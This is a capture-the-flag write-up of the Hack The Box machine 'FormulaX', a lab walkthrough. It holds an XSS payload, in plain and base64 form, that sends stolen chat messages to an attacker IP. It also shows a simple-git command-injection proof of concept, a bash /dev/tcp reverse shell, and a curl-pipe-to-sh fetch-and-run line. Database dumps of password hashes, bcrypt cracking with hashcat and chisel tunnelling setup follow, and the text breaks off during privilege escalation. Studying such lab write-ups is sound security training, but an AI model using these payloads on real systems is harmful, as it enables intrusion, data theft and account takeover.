# FormulaX Write-up

<img src="https://labs.hackthebox.com/storage/avatars/897faece9f60bf69d8e109833f63da48.png" width="200" height="200">

## Nmap

`nmap -sC -sV 10.10.11.6`

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   256 5f:b2:cd:54:e4:47:d1:0e:9e:81:35:92:3c:d6:a3:cb (ECDSA)
    |_  256 b9:f0:0d:dc:05:7b:fa:fb:91:e6:d0:b4:59:e6:db:88 (ED25519)
    80/tcp open  http    nginx 1.18.0 (Ubuntu)
    |_http-server-header: nginx/1.18.0 (Ubuntu)
    |_http-cors: GET POST
    | http-title: Site doesn't have a title (text/html; charset=UTF-8).
    |_Requested resource was /static/index.html
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Main page 

![main page](https://github.com/zer00d4y/writeups/assets/128820441/3a3da767-6608-4a9c-adb9-1daa98b7adbd)

Create account, login and click to the `Contact us` page 

![image](https://github.com/zer00d4y/writeups/assets/128820441/03f12159-e8aa-4ad2-be42-67d0b66cf0e3)

     const script = document.createElement('script');
    script.src = '/socket.io/socket.io.js';
    document.head.appendChild(script);
    script.addEventListener('load', function () {
        const res = axios.get(`/user/api/chat`);
        const socket = io('/', { withCredentials: true });
        socket.on('message', (my_message) => {
            fetch("http://10.10.14.42:80/?d=" + btoa(my_message))
        });
        socket.emit('client_message', 'history');
    });

XSS payload

    <img SRC=x onerror='eval(atob("BASE64-ENCODED-JAVASCRIPT-FILE"));' />

My payload

    <img SRC=x onerror='eval(atob("Y29uc3Qgc2NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CnNjcmlwdC5zcmMgPSAnL3NvY2tldC5pby9zb2NrZXQuaW8uanMnOwpkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKHNjcmlwdCk7CnNjcmlwdC5hZGRFdmVudExpc3RlbmVyKCdsb2FkJywgZnVuY3Rpb24gKCkgewogICAgY29uc3QgcmVzID0gYXhpb3MuZ2V0KGAvdXNlci9hcGkvY2hhdGApOwogICAgY29uc3Qgc29ja2V0ID0gaW8oJy8nLCB7IHdpdGhDcmVkZW50aWFsczogdHJ1ZSB9KTsKICAgIHNvY2tldC5vbignbWVzc2FnZScsIChteV9tZXNzYWdlKSA9PiB7CiAgICAgICAgZmV0Y2goImh0dHA6Ly8xMC4xMC4xNC40Mjo4MC8/ZD0iICsgYnRvYShteV9tZXNzYWdlKSkKICAgIH0pOwogICAgc29ja2V0LmVtaXQoJ2NsaWVudF9tZXNzYWdlJywgJ2hpc3RvcnknKTsKfSk7"));' />

![image](https://github.com/zer00d4y/writeups/assets/128820441/5a9d1ae4-6cd9-4790-b298-3048a0f9110e)

![image](https://github.com/zer00d4y/writeups/assets/128820441/62491b8d-d3c1-4213-9f66-45a61eea84d7)

![image](https://github.com/zer00d4y/writeups/assets/128820441/97cd1412-35f9-4aa7-98f5-1a482ec92c9a)

    echo 'R3JlZXRpbmdzIS4gSG93IGNhbiBpIGhlbHAgeW91IHRvZGF5ID8uIFlvdSBjYW4gdHlwZSBoZWxwIHRvIHNlZSBzb21lIGJ1aWxkaW4gY29tbWFuZHM=SGVsbG8sIEkgYW0gQWRtaW4uVGVzdGluZyB0aGUgQ2hhdCBBcHBsaWNhdGlvbg==V3JpdGUgYSBzY3JpcHQgZm9yICBkZXYtZ2l0LWF1dG8tdXBkYXRlLmNoYXRib3QuaHRiIHRvIHdvcmsgcHJvcGVybHk=' | base64 --decode 
    Greetings!. How can i help you today ?. You can type help to see some buildin commandsHello, I am Admin.Testing the Chat ApplicationWrite a script for  dev-git-auto-update.chatbot.htb to work properly  

Add `dev-git-auto-update.chatbot.htb` subdomain to the `/etc/hosts`

http://dev-git-auto-update.chatbot.htb/

![image](https://github.com/zer00d4y/writeups/assets/128820441/18b67a76-06a0-4ae5-b6b7-0e128f6ce741)

CVE

https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221?source=post_page-----e829d001852d--------------------------------

POC

    const simpleGit = require('simple-git')
    const git2 = simpleGit()
    git2.clone('ext::sh -c touch% /tmp/pwn% >&2', '/tmp/example-new-repo', ["-c", "protocol.ext.allow=always"]);

reverse shell payload

    bash -c 'exec bash -i &>/dev/tcp/10.10.14.42/1234 <&1'

![image](https://github.com/zer00d4y/writeups/assets/128820441/e64a3a4a-278d-45a9-b283-d5daac755a24)

    ext::sh -c curl% http://10.10.14.42/bash.sh|sh

![image](https://github.com/zer00d4y/writeups/assets/128820441/dff3ba0d-093e-4e8d-9e11-b26613bd990a)

![image](https://github.com/zer00d4y/writeups/assets/128820441/55817421-ea9f-4a3d-af98-ceb37d25ec74)

    mongo
    show dbs
    use testing
    show collections
    db.users.find()

![image](https://github.com/zer00d4y/writeups/assets/128820441/8c51d1f9-818b-492c-998e-c59e2f3894ea)

    { "_id" : ObjectId("648874de313b8717284f457c"), "name" : "admin", "email" : "admin@chatbot.htb", "password" : "$2b$10$VSrvhM/5YGM0uyCeEYf/TuvJzzTz.jDLVJ2QqtumdDoKGSa.6aIC.", "terms" : true, "value" : true, "authorization_token" : "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NDg4NzRkZTMxM2I4NzE3Mjg0ZjQ1N2MiLCJpYXQiOjE3MTI2NzAzODF9.a9YhNo2Jklg81S6_h-gTz4fPew3hkz78Ob8EpIpoQp8", "__v" : 0 }
    { "_id" : ObjectId("648874de313b8717284f457d"), "name" : "frank_dorky", "email" : "frank_dorky@chatbot.htb", "password" : "$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6", "terms" : true, "value" : true, "authorization_token" : " ", "__v" : 0 }

### Hashcat

echo '$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6' > hash.txt

hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

    $2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6:manchesterunited
                                                                                                                                                                                                                                                                 
    Session..........: hashcat                                                                                                                                                                                                                                   
    Status...........: Cracked                                                                                                                                                                                                                                   
    Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))                                                                                                                                                                                                       
    Hash.Target......: $2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s...psB4J6                                                                                                                                                                              
    Time.Started.....: Tue Apr  9 09:49:57 2024 (38 secs)                                                                                                                                                                                                        
    Time.Estimated...: Tue Apr  9 09:50:35 2024 (0 secs)                                                                                                                                                                                                         
    Kernel.Feature...: Pure Kernel                                                                                                                                                                                                                               
    Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)                                                                                                                                                                                                   
    Guess.Queue......: 1/1 (100.00%)                                                                                                                                                                                                                             
    Speed.#1.........:       75 H/s (6.28ms) @ Accel:4 Loops:32 Thr:1 Vec:1                                                                                                                                                                                      
    Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)                                                                                                                                                                                
    Progress.........: 2800/14344385 (0.02%)                                                                                                                                                                                                                     
    Rejected.........: 0/2800 (0.00%)                                                                                                                                                                                                                            
    Restore.Point....: 2784/14344385 (0.02%)                                                                                                                                                                                                                     
    Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:992-1024                                                                                                                                                                                                   
    Candidate.Engine.: Device Generator                                                                                                                                                                                                                          
    Candidates.#1....: meagan -> j123456                                                                                                                                                                                                                 
    Hardware.Mon.#1..: Util: 94%                                                                                                                                                                                                                                 
### SSH

ssh frank_dorky@formulax.htb

password: `manchesterunited`

![image](https://github.com/zer00d4y/writeups/assets/128820441/9bf17567-decc-471f-8306-5cf170452711)

Get the user flag

![image](https://github.com/zer00d4y/writeups/assets/128820441/9ff1854c-dff1-47df-a860-c4b2f23548d3)

## Privilege Escalation

![image](https://github.com/zer00d4y/writeups/assets/128820441/68aaed04-5670-48a5-9366-a60e44abf93d)

Chisel

GIT: https://github.com/jpillora/chisel

Download chisel for windows using wget and chisel url

    wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz

extract chisel 

    gzip -d chisel_1.9.1_windows_amd64.gz 

Open python server on your machine

![image](https://github.com/zer00d4y/writeups/assets/128820441/6e7ac664-2ff0-4613-87c6-0fe65c996abe)

Download chisel on frank machine 

    wget http://10.10.14.42:8080/chisel_1.9.1_windows_amd64

![image](https://github.com/zer00d4y/writeups/assets/128820441/f244d2d0-bc79-42d5-b1a3-b5f10575c626)

    mv chisel_1.9.1_windows_amd64 chisel

    chmod +x chisel 

    


